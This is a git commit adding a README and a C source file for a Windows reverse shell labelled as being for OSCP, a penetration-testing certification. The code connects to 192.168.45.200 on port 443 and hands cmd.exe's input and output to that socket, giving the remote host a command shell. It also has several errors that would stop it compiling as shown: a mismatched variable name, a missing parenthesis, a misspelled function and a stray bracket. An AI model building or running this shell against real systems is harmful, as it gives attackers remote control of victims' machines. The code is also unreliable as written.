6454a56ab3b3b07a33f8cfe0b2231e59c5e850aa
abb33rrant <abb3rrant@outlook.com>
2026-02-22 13:54:41 -0500

    Initial Commit

---
+++ README.md
@@ -0,0 +1,9 @@
+# Simple Shell for OSCP
+
+A simple shell written in C, change IP and port and build.
+
+**Build with:**
+```bash
+x86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32
+```
+
---
+++ shell.c
@@ -0,0 +1,34 @@
+#include <winsock2.h>
+#include <stdio.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
+
+int main () {
+	WSADATA wsaDATA;
+	SOCKET s;
+	struct sockaddr_in server;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+
+	WSAStartup(MAKEWORD(2,2), &wsaData);
+	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+
+	server.sin_family = AF_INET;
+	server.sin_port = htons(443);
+	server.sin_addr.s_addr = inet_addr("192.168.45.200");
+
+	WSAConnect(s, (struct sockaddr *)&server, sizeof(server), NULL, NULL, NULL, NULL;
+
+	memset(&si, 0, sizeof(si));
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
+
+	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	
+	closesocket(s);
+	WSACLeanup();
+	return 0;
+]
